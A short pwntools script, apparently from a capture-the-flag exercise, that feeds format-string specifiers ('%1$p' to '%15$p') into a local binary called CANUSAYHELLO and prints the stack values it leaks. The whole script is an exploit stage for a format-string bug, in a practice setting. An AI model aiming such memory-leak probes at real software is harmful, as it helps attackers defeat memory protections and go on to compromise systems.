from pwn import *

def print_info(msg):
    print("[\033[1;34m*\033[0m] " + f"{msg}")

elf = context.binary = ELF("./CANUSAYHELLO", checksec=False)
context.log_level = "error"

p = process()

for i in range(1,16):
    p.sendline(b"1")
    p.sendline(f"%{i}$p".encode())
    p.sendline(b"2")
    p.recvuntil(b"Hello ")
    leak = p.recvline().decode().strip()
    print_info(f"{i} : {leak}")
